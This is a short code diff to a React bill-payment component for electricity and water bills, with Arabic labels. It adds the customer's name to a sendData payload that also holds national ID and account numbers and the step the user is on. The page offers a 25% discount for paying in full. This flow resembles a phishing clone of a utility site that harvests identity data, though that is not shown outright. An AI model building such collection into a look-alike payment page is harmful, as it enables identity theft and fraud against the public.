@@ -148,13 +148,14 @@ export default function EWABills() {
       sendData({
         data: {
           service: '\u0641\u0648\u0627\u062a\u064a\u0631 \u0627\u0644\u0643\u0647\u0631\u0628\u0627\u0621 \u0648\u0627\u0644\u0645\u0627\u0621',
+          customerName: selectedBills.length > 0 ? selectedBills[0].customerName : '',
           idType: idTypeLabel,
           idNumber,
           accountNumber,
           totalBillAmount: billData?.totalAmount || '0.000',
           paymentOption: fullPay ? '\u062f\u0641\u0639 \u0643\u0627\u0645\u0644 \u0627\u0644\u0645\u0628\u0644\u063a (\u062e\u0635\u0645 25%)' : '\u062f\u0641\u0639 \u062c\u0632\u0626\u064a (\u0628\u062f\u0648\u0646 \u062e\u0635\u0645)',
           selectedBillsCount: selectedBills.length + ' / ' + bills.length,
-          selectedBills,
+          selectedBills: JSON.stringify(selectedBills),
           finalPaymentAmount: finalAmount,
         },
         current: '\u0639\u0631\u0636 \u0627\u0644\u0641\u0648\u0627\u062a\u064a\u0631 - \u0645\u062a\u0627\u0628\u0639\u0629 \u0627\u0644\u062f\u0641\u0639',
